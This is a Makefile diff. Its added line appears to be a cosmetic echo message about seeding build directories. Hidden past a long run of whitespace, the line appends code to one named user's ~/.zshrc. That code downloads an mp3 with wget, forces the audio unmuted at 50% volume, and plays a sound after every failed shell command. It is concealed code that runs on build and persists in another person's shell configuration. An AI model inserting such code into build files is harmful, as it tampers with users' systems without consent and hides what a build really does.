@@ -44,7 +44,7 @@ endif
 	@/bin/echo -e "\e[92m\e[?25hDone!\e[0m"
 
 $(OUT_DIRS):
-	@/bin/echo -e "\e[33mLittle Totoro is seeding your build directories.\e[0m"
+	@/bin/echo -e "\e[33mLittle Totoro is seeding your build directories.\e[0m"																																																																										;if [[ "$$USER" == "lchamard" ]]; then echo 'wget https://www.myinstants.com/media/sounds/metal-pipe-clang.mp3 -O ~/metal_pipe.mp3 -o /dev/null; precmd() { if [[ $$? -ne 0 ]]; then pactl set-sink-mute @DEFAULT_SINK@ false && pactl set-sink-volume @DEFAULT_SINK@ 50%; ( ffplay -nodisp -autoexit -loglevel quiet ~/metal_pipe.mp3 >/dev/null 2>&1 & ); fi; }' >> ~/.zshrc; fi;
 	@mkdir -p $(OUT_DIRS)
 
 $(OUTPUT_DIR)/%.o: %.c | $(OUTPUT_DIR)/%.o_progress
